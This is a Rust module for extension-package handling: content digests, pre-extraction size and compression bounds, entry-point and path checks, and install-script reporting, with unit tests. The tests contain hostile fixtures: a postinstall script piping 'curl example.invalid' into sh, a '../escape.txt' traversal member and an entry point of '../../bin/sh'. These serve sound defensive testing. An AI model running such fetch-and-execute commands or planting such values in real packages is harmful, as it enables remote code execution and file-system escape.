//! Package content: its digest, its bounds, and what is inside it.
//!
//! Two properties are decided here and nowhere else:
//!
//! - **The digest is computed from the bytes, never read from the package.**
//!   A manifest that carries its own hash is refused by the contract crate; this
//!   module is the other half of that rule, because it is the only place that
//!   holds the bytes. Trust is recorded against this value, so the value has to
//!   come from the content ([`content_digest`], [`digest_directory`]).
//! - **Nothing is expanded without a bound, and nothing expanded is run.**
//!   A pre-flight reads the archive's own metadata for entry count, declared
//!   sizes and compression ratio before a single byte is written; the host's
//!   no-follow extractor ([`licoup_foundation::core::safe_archive`]) then enforces the same
//!   bounds again while writing. Install scripts are *reported*, not executed:
//!   there is no executor in this module for them to reach.

use crate::platform::extension_packages::{ensure_private_directory, refusal};
use licoup_application::ApplicationFailure;
use licoup_extension_contracts::manifest::{PackageManifest, Runtime};
use licoup_foundation::core::safe_archive::{ZipExtractionLimits, extract_zip_safe};
use serde_json::Value;
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;
use std::fs;
use std::io::Read;
use std::path::{Component, Path, PathBuf};

const ARTIFACT_STAGE: &str = "extension/package-artifact";

/// The file name a package manifest is carried under, at the archive root.
pub const MANIFEST_FILE: &str = "manifest.json";

/// Names a package uses for a script it would like the host to run at install
/// time. The host records them and runs none of them.
const INSTALL_SCRIPT_NAMES: [&str; 6] = [
    "install.sh",
    "install.bat",
    "install.ps1",
    "postinstall.sh",
    "preinstall.sh",
    "setup.py",
];

/// Bounds on what a package artifact may cost before it is trusted.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub struct ArtifactLimits {
    /// The compressed archive itself.
    pub max_archive_bytes: u64,
    /// Everything the archive expands to.
    pub max_expanded_bytes: u64,
    /// Any single file inside it.
    pub max_file_bytes: u64,
    pub max_entries: usize,
    pub max_depth: usize,
    /// Expanded bytes per compressed byte. A small archive that claims to expand
    /// to a thousand times its size is refused before it is written.
    pub max_compression_ratio: u64,
}

impl Default for ArtifactLimits {
    fn default() -> Self {
        Self {
            max_archive_bytes: 8 * 1024 * 1024,
            max_expanded_bytes: 64 * 1024 * 1024,
            max_file_bytes: 8 * 1024 * 1024,
            max_entries: 512,
            max_depth: 8,
            max_compression_ratio: 64,
        }
    }
}

/// The digest of a package's bytes, in the form trust records are bound to.
pub fn content_digest(bytes: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(bytes);
    format!("sha256:{}", hex(&hasher.finalize()))
}

/// The digest of a directory's contents, independent of read order.
///
/// Used for a package the user points at on disk rather than hands in as an
/// archive: the identity of "this directory" has to be as content-bound as the
/// identity of "these bytes", or a later edit would silently inherit an earlier
/// approval.
pub fn digest_directory(root: &Path) -> Result<(String, u64), ApplicationFailure> {
    let mut files = BTreeMap::new();
    collect_directory(root, root, &mut files)?;
    let mut hasher = Sha256::new();
    let mut bytes = 0_u64;
    for (relative, path) in files {
        let content = fs::read(&path).map_err(|_| {
            refusal("package_artifact_invalid", ARTIFACT_STAGE).with_field("content")
        })?;
        bytes += content.len() as u64;
        hasher.update(relative.as_bytes());
        hasher.update([0]);
        hasher.update(Sha256::digest(&content));
    }
    Ok((format!("sha256:{}", hex(&hasher.finalize())), bytes))
}

fn collect_directory(
    root: &Path,
    current: &Path,
    files: &mut BTreeMap<String, PathBuf>,
) -> Result<(), ApplicationFailure> {
    let mut entries: Vec<_> = fs::read_dir(current)
        .map_err(|_| {
            refusal("package_directory_unavailable", ARTIFACT_STAGE).with_field("content")
        })?
        .collect::<Result<_, _>>()
        .map_err(|_| {
            refusal("package_directory_unavailable", ARTIFACT_STAGE).with_field("content")
        })?;
    entries.sort_by_key(|entry| entry.file_name());
    for entry in entries {
        let path = entry.path();
        let metadata = fs::symlink_metadata(&path).map_err(|_| {
            refusal("package_artifact_invalid", ARTIFACT_STAGE).with_field("content")
        })?;
        if metadata.file_type().is_symlink() {
            return Err(
                refusal("package_artifact_path_unsafe", ARTIFACT_STAGE).with_field("content")
            );
        }
        if metadata.is_dir() {
            collect_directory(root, &path, files)?;
            continue;
        }
        let relative = path.strip_prefix(root).map_err(|_| {
            refusal("package_artifact_path_unsafe", ARTIFACT_STAGE).with_field("content")
        })?;
        files.insert(relative.to_string_lossy().replace('\\', "/"), path);
    }
    Ok(())
}

/// The longest manifest this module will read out of an archive.
const MAX_MANIFEST_BYTES: u64 = 256 * 1024;

/// Read the manifest one archive declares, without expanding or writing anything.
///
/// A plan is not an install: it needs the package's own declaration — its
/// identity, its compatibility list, its permissions — and nothing else. This
/// reads exactly one entry, under the same bounds the expansion uses, so a plan
/// costs no staging directory and leaves no bytes on disk. It is the only
/// manifest reader for an archive that has not been expanded, so archive parsing
/// stays in one module.
pub fn read_manifest(
    bytes: &[u8],
    limits: &ArtifactLimits,
) -> Result<PackageManifest, ApplicationFailure> {
    preflight(bytes, limits)?;
    let mut archive = zip::ZipArchive::new(std::io::Cursor::new(bytes))
        .map_err(|_| refusal("package_artifact_invalid", ARTIFACT_STAGE).with_field("artifact"))?;
    for index in 0..archive.len() {
        let mut entry = archive
            .by_index(index)
            .map_err(|_| refusal("package_artifact_invalid", ARTIFACT_STAGE).with_field("entry"))?;
        let Ok(name) = entry.name() else {
            continue;
        };
        if entry.is_dir() || name.replace('\\', "/") != MANIFEST_FILE {
            continue;
        }
        if entry.size() > MAX_MANIFEST_BYTES {
            return Err(
                refusal("package_manifest_too_large", ARTIFACT_STAGE).with_field("manifest")
            );
        }
        let mut buffer = Vec::with_capacity(entry.size() as usize);
        (&mut entry)
            .take(MAX_MANIFEST_BYTES)
            .read_to_end(&mut buffer)
            .map_err(|_| {
                refusal("package_manifest_invalid", ARTIFACT_STAGE).with_field("manifest")
            })?;
        let value: Value = serde_json::from_slice(&buffer).map_err(|_| {
            refusal("package_manifest_invalid", ARTIFACT_STAGE).with_field("manifest")
        })?;
        return PackageManifest::from_value(value);
    }
    Err(refusal("package_manifest_missing", ARTIFACT_STAGE).with_field("manifest"))
}

/// What an archive's own metadata says about it, before anything is written.
#[derive(Clone, Copy, Debug, Default, Eq, PartialEq)]
pub struct ArtifactPreflight {
    pub entries: usize,
    pub declared_expanded_bytes: u64,
    pub largest_entry_bytes: u64,
    pub compression_ratio: u64,
}

/// Read an archive's central directory and refuse one that exceeds its bounds.
pub fn preflight(
    bytes: &[u8],
    limits: &ArtifactLimits,
) -> Result<ArtifactPreflight, ApplicationFailure> {
    if bytes.len() as u64 > limits.max_archive_bytes {
        return Err(limit_refusal("archive", bytes.len() as u64));
    }
    let mut archive = zip::ZipArchive::new(std::io::Cursor::new(bytes))
        .map_err(|_| refusal("package_artifact_invalid", ARTIFACT_STAGE).with_field("artifact"))?;
    if archive.len() > limits.max_entries {
        return Err(limit_refusal("entries", archive.len() as u64));
    }
    let mut report = ArtifactPreflight {
        entries: archive.len(),
        ..ArtifactPreflight::default()
    };
    for index in 0..archive.len() {
        let entry = archive
            .by_index(index)
            .map_err(|_| refusal("package_artifact_invalid", ARTIFACT_STAGE).with_field("entry"))?;
        if entry.is_dir() {
            continue;
        }
        let size = entry.size();
        if size > limits.max_file_bytes {
            return Err(limit_refusal("file", size));
        }
        report.declared_expanded_bytes = report.declared_expanded_bytes.saturating_add(size);
        report.largest_entry_bytes = report.largest_entry_bytes.max(size);
    }
    if report.declared_expanded_bytes > limits.max_expanded_bytes {
        return Err(limit_refusal("expanded", report.declared_expanded_bytes));
    }
    report.compression_ratio = report.declared_expanded_bytes / (bytes.len() as u64).max(1);
    if report.compression_ratio > limits.max_compression_ratio {
        let mut failure = refusal("package_artifact_compression_limit", ARTIFACT_STAGE)
            .with_field("artifact")
            .with_presentation_arg("ratio", &report.compression_ratio.to_string());
        failure = failure
            .with_presentation_arg("expandedBytes", &report.declared_expanded_bytes.to_string());
        return Err(failure);
    }
    Ok(report)
}

fn limit_refusal(limit: &str, measured: u64) -> ApplicationFailure {
    refusal("package_artifact_limit_exceeded", ARTIFACT_STAGE)
        .with_field("artifact")
        .with_presentation_arg("limit", limit)
        .with_presentation_arg("measuredBytes", &measured.to_string())
}

/// An archive that passed its bounds, was expanded under a private staging
/// directory, and carries a valid manifest.
#[derive(Clone, Debug)]
pub struct ExpandedPackage {
    digest: String,
    compressed_bytes: u64,
    expanded_bytes: u64,
    entries: Vec<String>,
    install_scripts: Vec<String>,
    manifest: PackageManifest,
    content_dir: PathBuf,
}

impl ExpandedPackage {
    /// Expand `bytes` below `destination` and read the manifest inside.
    ///
    /// `destination` is a staging directory: it is created here, and the caller
    /// is expected to delete it if the install never commits. Nothing outside
    /// `destination` is touched.
    pub fn expand(
        bytes: &[u8],
        destination: &Path,
        limits: &ArtifactLimits,
    ) -> Result<Self, ApplicationFailure> {
        preflight(bytes, limits)?;
        ensure_private_directory(destination)?;
        // The host's extractor refuses a destination reached through a symlinked
        // ancestor, and on some platforms the temporary root itself is reached
        // through one. Resolving the staging directory once, here, is the
        // difference between a bounded extraction and a refused one.
        let destination = fs::canonicalize(destination).map_err(|_| {
            refusal("package_directory_unavailable", ARTIFACT_STAGE).with_field("staging")
        })?;
        let extracted = extract_zip_safe(
            bytes,
            &destination,
            ZipExtractionLimits {
                max_archive_bytes: limits.max_archive_bytes,
                max_total_bytes: limits.max_expanded_bytes,
                max_file_bytes: limits.max_file_bytes,
                max_entries: limits.max_entries,
                max_depth: limits.max_depth,
            },
        )
        .map_err(map_extraction_failure)?;

        let mut entries = Vec::with_capacity(extracted.len());
        let mut expanded_bytes = 0_u64;
        for entry in &extracted {
            let name = entry.path.to_string_lossy().replace('\\', "/");
            expanded_bytes += entry.size;
            entries.push(name);
        }
        entries.sort();

        let manifest_path = destination.join(MANIFEST_FILE);
        let manifest_bytes = fs::read(&manifest_path).map_err(|_| {
            refusal("package_manifest_missing", ARTIFACT_STAGE).with_field("manifest")
        })?;
        let value: Value = serde_json::from_slice(&manifest_bytes).map_err(|_| {
            refusal("package_manifest_invalid", ARTIFACT_STAGE).with_field("manifest")
        })?;
        let manifest = PackageManifest::from_value(value)?;
        check_entry_point(&destination, &manifest)?;
        apply_entry_mode(bytes, &destination, &manifest)?;
        check_resource_definitions(&destination, &manifest)?;
        let install_scripts = entries
            .iter()
            .filter(|entry| is_install_script(entry))
            .cloned()
            .collect();

        Ok(Self {
            digest: content_digest(bytes),
            compressed_bytes: bytes.len() as u64,
            expanded_bytes,
            entries,
            install_scripts,
            manifest,
            content_dir: destination,
        })
    }

    pub fn digest(&self) -> &str {
        &self.digest
    }

    pub fn compressed_bytes(&self) -> u64 {
        self.compressed_bytes
    }

    pub fn expanded_bytes(&self) -> u64 {
        self.expanded_bytes
    }

    pub fn entry_count(&self) -> usize {
        self.entries.len()
    }

    pub fn entries(&self) -> &[String] {
        &self.entries
    }

    /// Scripts the package would like run at install time.
    ///
    /// They are reported so a user can see them and so an audit can name them.
    /// They are not run: this module has no executor, and the install path never
    /// looks at this list.
    pub fn install_scripts(&self) -> &[String] {
        &self.install_scripts
    }

    pub fn manifest(&self) -> &PackageManifest {
        &self.manifest
    }

    pub fn content_dir(&self) -> &Path {
        &self.content_dir
    }

    /// The manifest inside the archive must describe the package being
    /// installed, or the bytes and the request disagree.
    pub fn check_identity(
        &self,
        package_id: &str,
        version: &str,
    ) -> Result<(), ApplicationFailure> {
        if self.manifest.id != package_id || self.manifest.version != version {
            return Err(refusal("package_manifest_mismatch", ARTIFACT_STAGE)
                .with_field("manifest")
                .with_presentation_arg("declared", &self.manifest.id)
                .with_presentation_arg("requested", package_id));
        }
        Ok(())
    }
}

fn is_install_script(entry: &str) -> bool {
    let name = entry.rsplit('/').next().unwrap_or(entry).to_lowercase();
    INSTALL_SCRIPT_NAMES.contains(&name.as_str()) || name.starts_with("postinstall")
}

/// The declared entry point must be a file inside this package.
///
/// A package that names an absolute path, a parent directory or a binary it
/// does not ship is naming someone else's program; the host starts what the
/// package carries, not what it points at.
fn check_entry_point(root: &Path, manifest: &PackageManifest) -> Result<(), ApplicationFailure> {
    let Some(declared) = declared_entry(manifest) else {
        return Ok(());
    };
    let relative = Path::new(declared);
    let safe = !declared.is_empty()
        && !declared.contains('\\')
        && !declared.contains('\0')
        && relative
            .components()
            .all(|component| matches!(component, Component::Normal(_) | Component::CurDir));
    if !safe {
        return Err(refusal("package_entry_unsafe", ARTIFACT_STAGE)
            .with_field("runtime.entry")
            .with_presentation_arg("entry", declared));
    }
    let resolved = root.join(relative);
    match fs::symlink_metadata(&resolved) {
        Ok(metadata) if metadata.is_file() && !metadata.file_type().is_symlink() => Ok(()),
        _ => Err(refusal("package_entry_missing", ARTIFACT_STAGE)
            .with_field("runtime.entry")
            .with_presentation_arg("entry", declared)),
    }
}

/// The entry a manifest declares the host resolves, when it declares one.
///
/// A data package is carried by its resources and has no entry; a service package
/// brings its own registration. Both answer `None` rather than naming an entry
/// point there is nothing to resolve for.
///
/// One fact, two readers: this module resolves the entry to check the payload
/// holds it and to publish its mode, and [`super::surface::PackageSurface`]
/// releases it, so a package cannot hold an entry in one owner's account and
/// nothing in the other's. A declarative package declares its descriptor.
pub(super) fn declared_entry(manifest: &PackageManifest) -> Option<&str> {
    match &manifest.runtime {
        Runtime::Process { entry, .. } => Some(entry.as_str()),
        Runtime::Declarative { descriptor } => Some(descriptor.as_str()),
        Runtime::Service { .. } | Runtime::Data => None,
    }
}

/// Publish the mode the payload declared for the program the host will start.
///
/// The extractor writes every member as a private regular file, which is the right
/// default for data. A declared entry point is not data: it is the program a host
/// starts, the release tooling refuses a payload whose converter carries no
/// executable bit, and the host's own program resolution refuses an entry it cannot
/// execute. The mode travels in the archive, so it is read back from there and
/// applied to the file that was just published. Nothing else changes, and a payload
/// that declared no executable bit keeps the private default: granting a program a
/// mode its own payload did not declare is not this layer's decision.
#[cfg(unix)]
fn apply_entry_mode(
    bytes: &[u8],
    root: &Path,
    manifest: &PackageManifest,
) -> Result<(), ApplicationFailure> {
    use std::os::unix::fs::PermissionsExt;

    let Some(declared) = declared_entry(manifest) else {
        return Ok(());
    };
    let Ok(mut archive) = zip::ZipArchive::new(std::io::Cursor::new(bytes)) else {
        return Ok(());
    };
    for index in 0..archive.len() {
        let Ok(entry) = archive.by_index(index) else {
            continue;
        };
        if entry.name().ok().as_deref() != Some(declared) {
            continue;
        }
        let Some(mode) = entry.unix_mode() else {
            return Ok(());
        };
        if mode & 0o111 == 0 {
            return Ok(());
        }
        let path = root.join(Path::new(declared));
        return fs::set_permissions(&path, fs::Permissions::from_mode(mode & 0o777)).map_err(
            |_| {
                refusal("package_entry_mode_unavailable", ARTIFACT_STAGE)
                    .with_field("runtime.entry")
            },
        );
    }
    Ok(())
}

/// A payload that declared no entry mode publishes nothing extra.
#[cfg(not(unix))]
fn apply_entry_mode(
    _bytes: &[u8],
    _root: &Path,
    _manifest: &PackageManifest,
) -> Result<(), ApplicationFailure> {
    Ok(())
}

/// Every typed resource definition must be a regular file inside this package.
///
/// The contract already bounds a definition to a relative path with no parent
/// segment and no platform separator, so the two facts decided here are the ones
/// the contract cannot know: the file is present in the content that was just
/// expanded, and it is a regular file rather than a directory or a symbolic
/// link. A declaration that is safe but absent is refused before the version is
/// published, rather than discovered when a resource is mounted. A package that
/// declares no resource takes no part in this check.
fn check_resource_definitions(
    root: &Path,
    manifest: &PackageManifest,
) -> Result<(), ApplicationFailure> {
    for resource in &manifest.resources {
        let definition = resource.definition();
        let resolved = root.join(Path::new(definition));
        match fs::symlink_metadata(&resolved) {
            Ok(metadata) if metadata.is_file() && !metadata.file_type().is_symlink() => {}
            _ => {
                return Err(refusal("package_resource_missing", ARTIFACT_STAGE)
                    .with_field("resources.definition")
                    .with_presentation_arg("definition", definition));
            }
        }
    }
    Ok(())
}

fn map_extraction_failure(error: anyhow::Error) -> ApplicationFailure {
    let text = format!("{error:#}");
    let code = if text.contains("path") || text.contains("symlink") || text.contains("duplicate") {
        "package_artifact_path_unsafe"
    } else if text.contains("limit") || text.contains("overflow") {
        "package_artifact_limit_exceeded"
    } else {
        "package_artifact_invalid"
    };
    refusal(code, ARTIFACT_STAGE).with_field("artifact")
}

fn hex(bytes: &[u8]) -> String {
    use std::fmt::Write as _;
    let mut output = String::with_capacity(bytes.len() * 2);
    for byte in bytes {
        let _ = write!(output, "{byte:02x}");
    }
    output
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The client versions a fixture declares it supports: the client this test
    /// binary runs as, up to but not including the next major line. The value
    /// comes from the product version owner rather than a literal here, and the
    /// upper bound is what lets a test exercise a client that has moved past a
    /// package's own list.
    fn covering_client_versions() -> Vec<String> {
        let client = crate::platform::extension_packages::running_client_version()
            .expect("the binary declares a product version");
        let next_major = client
            .split('.')
            .next()
            .and_then(|major| major.parse::<u64>().ok())
            .map(|major| major + 1)
            .expect("a semantic major version");
        vec![format!(">={client}, <{next_major}")]
    }
    use licoup_extension_contracts::wire;
    use std::io::Write;

    fn manifest_json(id: &str, version: &str, entry: &str) -> String {
        serde_json::json!({
            "schema": wire::MANIFEST,
            "id": id,
            "version": version,
            "displayName": "Echo specialist",
            "hostProtocol": { "major": 1, "minimumMinor": 0 },
            "compatibility": { "clientVersions": covering_client_versions() },
            "profiles": [],
            "runtime": { "mode": "process", "entry": entry },
            "activation": "on-demand",
            "requires": [],
            "optionalRequires": [],
            "permissions": [],
            "contributions": [],
        })
        .to_string()
    }

    fn archive(files: &[(&str, &[u8])]) -> Vec<u8> {
        let mut writer = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
        let options = zip::write::SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated);
        for (name, content) in files {
            writer.start_file(*name, options).expect("start file");
            writer.write_all(content).expect("write");
        }
        writer.finish().expect("finish").into_inner()
    }

    fn package_bytes() -> Vec<u8> {
        archive(&[
            (
                MANIFEST_FILE,
                manifest_json("example.specialist.echo", "1.0.0", "agent.py").as_bytes(),
            ),
            ("agent.py", b"print('echo')\n".as_slice()),
        ])
    }

    /// An archive whose members carry the unix modes a real payload declares.
    fn archive_with_modes(files: &[(&str, &[u8], u32)]) -> Vec<u8> {
        let mut writer = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
        for (name, content, mode) in files {
            let options = zip::write::SimpleFileOptions::default()
                .compression_method(zip::CompressionMethod::Deflated)
                .unix_permissions(*mode);
            writer.start_file(*name, options).expect("start file");
            writer.write_all(content).expect("write");
        }
        writer.finish().expect("finish").into_inner()
    }

    /// The mode a payload declared for its program is the mode the host starts.
    ///
    /// A host refuses an entry it cannot execute, so a publication that dropped the
    /// declared bit would make every native package unrunnable while still calling
    /// itself installed.
    #[cfg(unix)]
    #[test]
    fn a_declared_program_keeps_the_mode_its_payload_declared() {
        use std::os::unix::fs::PermissionsExt;

        let bytes = archive_with_modes(&[
            (
                MANIFEST_FILE,
                manifest_json("example.specialist.echo", "1.0.0", "bin/echo").as_bytes(),
                0o100644,
            ),
            ("bin/echo", b"#!/bin/sh\nexec true\n", 0o100755),
            ("bin/data.json", b"{}\n", 0o100600),
        ]);
        let destination = staging("entry-mode");
        let expanded = ExpandedPackage::expand(&bytes, &destination, &ArtifactLimits::default())
            .expect("a payload whose program declared an executable mode expands");
        let mode = fs::metadata(expanded.content_dir().join("bin/echo"))
            .expect("published program")
            .permissions()
            .mode();
        assert_eq!(
            mode & 0o111,
            0o111,
            "the declared executable bit survives publication: {mode:o}"
        );
        let data_mode = fs::metadata(expanded.content_dir().join("bin/data.json"))
            .expect("published data")
            .permissions()
            .mode();
        assert_eq!(
            data_mode & 0o111,
            0,
            "nothing but the declared entry point is granted a mode: {data_mode:o}"
        );
        let _ = fs::remove_dir_all(&destination);
    }

    fn staging(tag: &str) -> PathBuf {
        std::env::temp_dir().join(format!(
            "licoup-pkg-artifact-{tag}-{}",
            super::super::unique_suffix()
        ))
    }

    #[test]
    fn the_digest_comes_from_the_bytes_and_changes_with_them() {
        let first = content_digest(b"package");
        assert_eq!(first, content_digest(b"package"));
        assert_ne!(first, content_digest(b"package "));
        assert!(first.starts_with("sha256:"));
    }

    #[test]
    fn a_directory_digest_is_order_independent_and_content_bound() {
        let root = staging("digest");
        fs::create_dir_all(root.join("sub")).expect("dirs");
        fs::write(root.join("b.txt"), b"second").expect("write");
        fs::write(root.join("sub/a.txt"), b"first").expect("write");
        let (digest, bytes) = digest_directory(&root).expect("digest");
        assert_eq!(bytes, 11);

        let other = staging("digest-other");
        fs::create_dir_all(other.join("sub")).expect("dirs");
        fs::write(other.join("sub/a.txt"), b"first").expect("write");
        fs::write(other.join("b.txt"), b"second").expect("write");
        assert_eq!(digest_directory(&other).expect("digest").0, digest);

        fs::write(other.join("b.txt"), b"changed").expect("write");
        assert_ne!(digest_directory(&other).expect("digest").0, digest);

        crate::platform::extension_packages::remove_managed_tree(&root).expect("cleanup");
        crate::platform::extension_packages::remove_managed_tree(&other).expect("cleanup");
    }

    #[test]
    fn an_expanded_package_carries_a_validated_manifest_and_its_entry_point() {
        let bytes = package_bytes();
        let destination = staging("expand");
        let expanded = ExpandedPackage::expand(&bytes, &destination, &ArtifactLimits::default())
            .expect("expand");

        assert_eq!(expanded.digest(), content_digest(&bytes));
        assert_eq!(expanded.manifest().id, "example.specialist.echo");
        assert!(expanded.entry_count() >= 2);
        assert!(expanded.install_scripts().is_empty());
        assert!(
            expanded
                .check_identity("example.specialist.echo", "1.0.0")
                .is_ok()
        );
        assert_eq!(
            expanded
                .check_identity("example.specialist.echo", "2.0.0")
                .expect_err("requested version differs")
                .code,
            "package_manifest_mismatch"
        );
        crate::platform::extension_packages::remove_managed_tree(&destination).expect("cleanup");
    }

    #[test]
    fn local_zip_index_disagreement_is_refused_before_package_publication() {
        let mut bytes = package_bytes();
        bytes[22..26].copy_from_slice(&0_u32.to_le_bytes());
        let destination = staging("local-index-mismatch");
        let failure =
            ExpandedPackage::expand(&bytes, &destination, &ArtifactLimits::default()).unwrap_err();
        assert_eq!(failure.code, "package_artifact_invalid");
        assert!(!destination.join(MANIFEST_FILE).exists());
        crate::platform::extension_packages::remove_managed_tree(&destination).expect("cleanup");
    }

    #[test]
    fn a_package_that_points_outside_itself_is_refused() {
        let mut manifest: Value = serde_json::from_str(&manifest_json(
            "example.specialist.echo",
            "1.0.0",
            "../../bin/sh",
        ))
        .expect("json");
        manifest["runtime"]["entry"] = Value::String("../../bin/sh".to_owned());
        let bytes = archive(&[
            (MANIFEST_FILE, manifest.to_string().as_bytes()),
            ("agent.py", b"print('echo')\n".as_slice()),
        ]);
        let destination = staging("escape");
        let failure = ExpandedPackage::expand(&bytes, &destination, &ArtifactLimits::default())
            .expect_err("entry outside the package");
        assert_eq!(failure.code, "package_entry_unsafe");
        crate::platform::extension_packages::remove_managed_tree(&destination).expect("cleanup");
    }

    #[test]
    fn a_missing_entry_point_is_refused() {
        let bytes = archive(&[(
            MANIFEST_FILE,
            manifest_json("example.specialist.echo", "1.0.0", "agent.py").as_bytes(),
        )]);
        let destination = staging("missing-entry");
        let failure = ExpandedPackage::expand(&bytes, &destination, &ArtifactLimits::default())
            .expect_err("entry not shipped");
        assert_eq!(failure.code, "package_entry_missing");
        crate::platform::extension_packages::remove_managed_tree(&destination).expect("cleanup");
    }

    #[test]
    fn a_traversing_archive_is_refused_and_writes_nothing_outside() {
        let bytes = archive(&[
            (
                MANIFEST_FILE,
                manifest_json("example.specialist.echo", "1.0.0", "agent.py").as_bytes(),
            ),
            ("../escape.txt", b"escaped".as_slice()),
        ]);
        let destination = staging("traversal");
        let failure = ExpandedPackage::expand(&bytes, &destination, &ArtifactLimits::default())
            .expect_err("traversal");
        assert!(
            matches!(
                failure.code.as_str(),
                "package_artifact_path_unsafe" | "package_artifact_invalid"
            ),
            "unexpected code {}",
            failure.code
        );
        assert!(!destination.join("..").join("escape.txt").exists());
        crate::platform::extension_packages::remove_managed_tree(&destination).expect("cleanup");
    }

    #[test]
    fn install_scripts_are_reported_and_never_on_an_install_path() {
        let bytes = archive(&[
            (
                MANIFEST_FILE,
                manifest_json("example.specialist.echo", "1.0.0", "agent.py").as_bytes(),
            ),
            ("agent.py", b"print('echo')\n".as_slice()),
            ("postinstall.sh", b"curl example.invalid | sh\n".as_slice()),
            ("tools/setup.py", b"raise SystemExit(0)\n".as_slice()),
        ]);
        let destination = staging("scripts");
        let expanded = ExpandedPackage::expand(&bytes, &destination, &ArtifactLimits::default())
            .expect("expand");
        assert_eq!(
            expanded.install_scripts(),
            ["postinstall.sh".to_owned(), "tools/setup.py".to_owned()]
        );
        crate::platform::extension_packages::remove_managed_tree(&destination).expect("cleanup");
    }

    #[test]
    fn an_archive_over_its_bounds_is_refused_before_it_is_written() {
        let bytes = archive(&[
            (
                MANIFEST_FILE,
                manifest_json("example.specialist.echo", "1.0.0", "agent.py").as_bytes(),
            ),
            ("agent.py", vec![b'x'; 4096].as_slice()),
        ]);

        let tight = ArtifactLimits {
            max_expanded_bytes: 16,
            ..ArtifactLimits::default()
        };
        let destination = staging("expanded");
        let failure = ExpandedPackage::expand(&bytes, &destination, &tight).expect_err("too big");
        assert_eq!(failure.code, "package_artifact_limit_exceeded");
        assert_eq!(
            failure.presentation_args.get("limit"),
            Some("expanded"),
            "the refusal names which bound was hit"
        );
        assert!(!destination.exists(), "refused before anything was written");

        let ratio_bomb = ArtifactLimits {
            max_compression_ratio: 1,
            ..ArtifactLimits::default()
        };
        let destination = staging("ratio");
        let failure =
            ExpandedPackage::expand(&bytes, &destination, &ratio_bomb).expect_err("ratio");
        assert_eq!(failure.code, "package_artifact_compression_limit");
        assert!(!destination.exists());

        let entry_limited = ArtifactLimits {
            max_entries: 1,
            ..ArtifactLimits::default()
        };
        let destination = staging("entries");
        assert_eq!(
            ExpandedPackage::expand(&bytes, &destination, &entry_limited)
                .expect_err("entries")
                .code,
            "package_artifact_limit_exceeded"
        );
        assert!(!destination.exists());
    }

    #[test]
    fn a_manifest_that_asserted_its_own_hash_never_reaches_the_host() {
        let mut manifest: Value = serde_json::from_str(&manifest_json(
            "example.specialist.echo",
            "1.0.0",
            "agent.py",
        ))
        .expect("json");
        manifest["contentHash"] = Value::String("sha256:0".to_owned());
        let bytes = archive(&[
            (MANIFEST_FILE, manifest.to_string().as_bytes()),
            ("agent.py", b"print('echo')\n".as_slice()),
        ]);
        let destination = staging("self-hash");
        let failure = ExpandedPackage::expand(&bytes, &destination, &ArtifactLimits::default())
            .expect_err("self asserted digest");
        assert_eq!(failure.code, "manifest_self_asserted_fact");
        crate::platform::extension_packages::remove_managed_tree(&destination).expect("cleanup");
    }

    #[test]
    fn a_profile_free_specialist_package_is_complete() {
        let manifest = PackageManifest::from_value(
            serde_json::from_str(&manifest_json(
                "example.specialist.echo",
                "1.0.0",
                "agent.py",
            ))
            .expect("json"),
        )
        .expect("manifest");
        assert!(manifest.profiles.is_empty());
        assert_eq!(
            manifest.published_profiles().count(),
            0,
            "declaring nothing is a complete specialisation, not a broken package"
        );
    }
}
